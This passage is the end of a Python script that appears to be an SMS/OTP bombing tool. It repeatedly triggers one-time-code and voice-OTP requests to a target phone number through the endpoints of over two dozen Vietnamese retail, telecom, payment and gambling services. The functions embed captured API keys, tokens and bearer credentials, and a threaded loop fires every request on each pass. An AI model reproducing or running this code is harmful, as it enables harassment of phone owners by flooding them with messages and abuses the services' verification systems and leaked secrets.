		'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
		'x-token': 'dd01a21c9a0efde25c1b501ee6199c08',
	}
	json_data = {
		'phone': phone,
		'app_id': 'b52.club',
		'fg_id': '146fca9965e795f8f787485ecca8c61d',
	}
	response = requests.post('https://bfivegwpeymint.gwtenkges.com/otp/send', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def yo88(phone):
	headers = {
		'accept': '*/*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'content-type': 'application/json',
		'origin': 'https://web.yo88.tv',
		'priority': 'u=1, i',
		'referer': 'https://web.yo88.tv/',
		'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
		'x-token': '833b77d3e3bd5caf6a6d7943c7b4015c',
	}
	json_data = {
		'phone': phone,
		'app_id': 'yo88win',
		'fg_id': '146fca9965e795f8f787485ecca8c61d',
	}
	response = requests.post('https://pmbodergw.dsrcgoms.net/otp/send', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def zowin(phone):
	headers = {
		'accept': '*/*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'authorization': '8f5e9746a22a4d2c9c6d945539ba564b',
		'origin': 'https://i.zo10.win',
		'priority': 'u=1, i',
		'referer': 'https://i.zo10.win/',
		'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
	}
	params = {
		'command': 'getOTPCode',
		'type': '1',
		'phone': phone,
	}
	response = requests.get('https://api.azhkthg1.net/paygate', params=params, headers=headers)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
	#không mã
def fptshop(phone):
	headers = {
		'accept': '*/*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
		'content-type': 'application/json',
		'order-channel': '1',
		'origin': 'https://fptshop.com.vn',
		'priority': 'u=1, i',
		'referer': 'https://fptshop.com.vn/',
		'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
	}

	json_data = {
		'fromSys': 'WEBKHICT',
		'otpType': '0',
		'phoneNumber': phone,
	}

	response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def iloka(phone):
	headers = {
		'Host': 'back.iloka.vn:9999',
		'Content-Type': 'application/json',
		'Origin': 'capacitor://localhost',
		'Connection': 'keep-alive',
		'Accept': 'application/json, text/plain, */*',
		'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
		'Content-Length': '22',
		'Accept-Language': 'vi-VN,vi;q=0.9',
		'Accept-Encoding': 'gzip, deflate',
	}
	json_data = {
  		"phone": phone,
	}
	response = requests.post('http://back.iloka.vn:9999/api/v2/customer/sentVoiceOTP', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def norifood(phone):
	headers = {
		'Host': 'gateway.norifood.vn',
		'Content-Type': 'application/json',
		'User-Agent': 'NoriFood/25021801 CFNetwork/3826.400.120 Darwin/24.3.0',
		'Connection': 'keep-alive',
		'Accept': 'application/json',
		'secret-code': '7bc79fa5139b8266e12993014bb68955',
		'Content-Length': '34',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'vi-VN,vi;q=0.9'
	}
	json_data = {
		"phone": phone,
		"type": None,
	}
	response = requests.post('https://gateway.norifood.vn/sso/api/auth/sendOTP', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def fa88(phone):
	headers = {
		'accept': '*/*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'content-type': 'application/json',
		'origin': 'https://v.fa88.tv',
		'priority': 'u=1, i',
		'referer': 'https://v.fa88.tv/',
		'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
		'x-token': 'bcdb79c350327745b7522a40d4ab673b',
	}
	json_data = {
		'phone': phone,
		'app_id': 'fa88club',
		'fg_id': '146fca9965e795f8f787485ecca8c61d',
	}
	response = requests.post('https://pmbodergw.dsrcgoms.net/otp/send', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def vhome(phone):
	headers = {
		'host': 'vcloudapi.innoway.vn',
		'accept': '*/*',
		'content-type': 'application/json',
		'appkey': 'nlaDOC8uS6Xn7L0JIcPD',
		'user-agent': 'VTHome/2 CFNetwork/3826.400.120 Darwin/24.3.0',
		'appsecret': 'yKeMoImiHp9DUXxoGpERza31xSyCWunW',
		'traceparent': '00-F1D0BD06A5534C8BB05BE6FD5D1A0066-0000000000000000-01',
		'accept-language': 'vi-VN,vi;q=0.9',
		'content-length': '44',
		'accept-encoding': 'gzip, deflate, br'
	}

	json_data = {
		"otp_type": "register",
		"phone": phone,
	}
	response = requests.post('https://vcloudapi.innoway.vn/api/app/otp/vhome', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def phuha(phone):
	headers = {
		'Host': 'phuha.winds.vn',
		'Content-Type': 'application/json',
		'User-Agent': 'PHUHA/4 CFNetwork/3826.400.120 Darwin/24.3.0',
		'Connection': 'keep-alive',
		'Accept': '*/*',
		'token': '',
		'Content-Length': '22',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'vi-VN,vi;q=0.9'
	}

	json_data = {
  		"phone": phone,	
	}
	response = requests.post('http://phuha.winds.vn/api/service/CheckPhone', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def aemon(phone):
	headers = {
		'Host': 'membersapp.aeon.com.vn',
		'Content-Type': 'application/json',
		'Accept-Encoding': 'gzip, deflate, br',
		'Cookie': 'language=vi',
		'Connection': 'keep-alive',
		'x-api-key': '3EB76D87D97C427943957C555AB0B60847582D38CB1688ED86C59251206305E3',
		'Accept': 'application/json',
		'User-Agent': 'com.aeonvn.membersapp/1.6.5/IOS/RELEASE',
		'Accept-Language': 'vi',
		'x-request-id': 'D650BC1C-5C71-4CD3-BBDC-7D46741E5AFD',
		'Content-Length': '40'
	}
	json_data = {
		"screen": 1,
		"phone_number": phone,
	}
	response = requests.post('https://membersapp.aeon.com.vn/api/otp', headers=headers, json=json_data, verify=False)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def fptplay(phone):
	headers = {
		'Host': 'api.foxpay.vn',
		'client-type': 'App',
		'ip-address': '14.191.171.193',
		'Authorization': 'Bearer t10xelgj5/nVbKRCBm04N6mbb23rc7wd6ZUlBXHG7TcfT4MRX2Xi8pPQk2oG8No6LzOZCMUZKcodHF20aAXE61qnaSKgNJUS+21bE7uZZlhfNfpXnPfVLFdfmsXLN6mlmff7jGalsGBIN/doiklFJp0Cl9J6oYB7Yfy7AYbb0JjcgcbAMfW6h2xQCiwus/rYoU7dyqz2u4ZvDCz8gMO7FP36Xk6Qu8opj44ZqpEy+a8kYgqriLNW2aSCO6TFlEXkOF1QoIye0KYSSKCtFsWji2aq/uMXELDB9NHM7/g4okznCpuIfnPewAC2cEz9VdGhiTtqNvk6F+v5uddVsfRO4bFjTXF94MqP3A8sRiqF8RYoXl4mvLvKUszDf47F5vsR4S2Senv/CxF8nXBicVevaFYfEEIvJlqp6r3MqKtosHKiFOiiqQVqUTxI98L/Suhl/Ja+Jg6iwW2cGDGRJfkYewTvR8AlQHHjyaIIaJa5IzkM/WtVmJjUVhkW0Yhch2IW6BgLyDCrctZaobRsLZeZfBzjm/1m0L5WILAp9tL9VKBHv3lWYikaAauk4mLawKK76PChgfTaqqg6yvtIjS0RRwkWCHtYp1vCGl7R47Q8+q4+EJK86/ZjxDEZXqLh9T2FO/sa9BTv9wPM/8CKaCaiqC8TJC4NMQhFL4Lu20d+e5td3bRYyx7+oVQTlOYGp4VnauiAou7NwYUnvGUb7PeePYP821fnVaQwMRZkhdbuOINSxp7vtie5W7W6wZ5FN2R0vCo/ONUmQkurM2LdfQZeLdsXTqvR4kbrtfEeZ4aCbgpcWrEvNK6CzupCU6FotfOp2aQrsyAkhR632RF8tDNH3yptn4aH2QhuM22WX3j1tQ2TwRgVasBop3MCk4R1QpkMxqKaOBy1gXs6taigUnxVC2Hqt1IAukJqxH9jeNcrg+yhr8zQBhFOGvUesoXXvsEGysQ0FL91WI9CTAcqZ7kDGbGKjETpwr9zXksVlPW+tr88D3/ZbjbvhT8MQURqTExeDucif/TXQJdxQIpzy5Es1Nqx6lFHiHArbU3Nh3RG92C+LoMq01WH/y28vnUqKqyTtaZc/VMBP3HkkNJZBLAglA==',
		'Accept': '*/*',
		'device-id': 'D5E6B9C9-E00F-492B-BBEC-FB363708A940',
		'client-version': '3.2.2.1',
		'device-type': 'iOS_18_3_2_iPhone_11',
		'Accept-Encoding': 'br;q=1.0, gzip;q=0.9, deflate;q=0.8',
		'Accept-Language': 'vi-VN;q=1.0',
		'Content-Type': 'application/json',
		'Content-Length': '56',
		'User-Agent': 'FPT Pay/3.2.2 (com.ftel.foxpay; build:1; iOS 18.3.2) Alamofire/5.6.4',
		'lang': 'vi',
		'Connection': 'keep-alive'
	}
	json_data = {
		"username": phone,
		"country_code": "84"
	}
	response = requests.post('https://api.foxpay.vn/v1/oauth/account/register', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def savyu(phone):
	headers = {
		'host': 'api.savyu.com',
		'content-type': 'application/json',
		'consumer-app-version': '6.4.1',
		'accept': 'application/json',
		'accept-language': 'vi-VN,vi;q=0.9',
		'accept-encoding': 'gzip, deflate, br',
		'deviceuuid': 'BA857157-060E-4A4C-A2C6-FC0D628894D0',
		'deviceinfo': 'iPhone12,1',
		'user-agent': 'SavyuConsumer/1 CFNetwork/3826.400.120 Darwin/24.3.0',
		'content-length': '111',
		'osversion': '18.3.2',
		'devicebrand': 'Apple'
	}
	json_data = {
		"account": phone,
		"country_code": "+84",
		"device_uuid": "BA857157-060E-4A4C-A2C6-FC0D628894D0",
		"platform": 3,
	}
	response = requests.post('https://api.savyu.com/api/otp/send-code', headers=headers, json=json_data, verify=False)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
# hàm chạy


def run(sdt, i):
	threading.submit(vieon,sdt)
	time.sleep(0.1)
	threading.submit(vtmoney,sdt)
	time.sleep(0.1)
	threading.submit(best_inc,sdt)
	time.sleep(0.1)
	threading.submit(vtpost,sdt)
	time.sleep(0.1)
	threading.submit(tv360,sdt)
	time.sleep(0.1)
	threading.submit(mobifone,sdt)
	time.sleep(0.1)
	threading.submit(myvnpt,sdt)
	time.sleep(0.1)
	threading.submit(pizzacompany,sdt)
	time.sleep(0.1)
	threading.submit(chotot,sdt)
	time.sleep(0.1)
	threading.submit(bhx,sdt)
	time.sleep(0.1)
	threading.submit(viettel,sdt)
	time.sleep(0.1)
	threading.submit(sunwin,sdt)
	time.sleep(0.1)
	threading.submit(hitclb,sdt)
	time.sleep(0.1)
	threading.submit(go88,sdt)
	time.sleep(0.1)
	threading.submit(gemwwin,sdt)
	time.sleep(0.1)
	threading.submit(b52,sdt)
	time.sleep(0.1)
	threading.submit(yo88,sdt)
	time.sleep(0.1)
	threading.submit(zowin,sdt)
	time.sleep(0.1)
	threading.submit(fptshop,sdt)
	time.sleep(0.1)
	threading.submit(iloka,sdt)
	time.sleep(0.1)
	threading.submit(norifood,sdt)
	time.sleep(0.1)
	threading.submit(fa88,sdt)
	time.sleep(0.1)
	threading.submit(vhome,sdt)
	time.sleep(0.1)
	threading.submit(phuha,sdt)
	time.sleep(0.1)
	threading.submit(aemon,sdt)
	time.sleep(0.1)
	threading.submit(fptplay,sdt)
	time.sleep(0.1)
	threading.submit(savyu,sdt)
	time.sleep(0.1)
	print("\033[1;35mTHÀNH CÔNG LẦN ▶ ",i)

# gọi chạy
for i in range(1,count+1):
  	run(sdt,i)
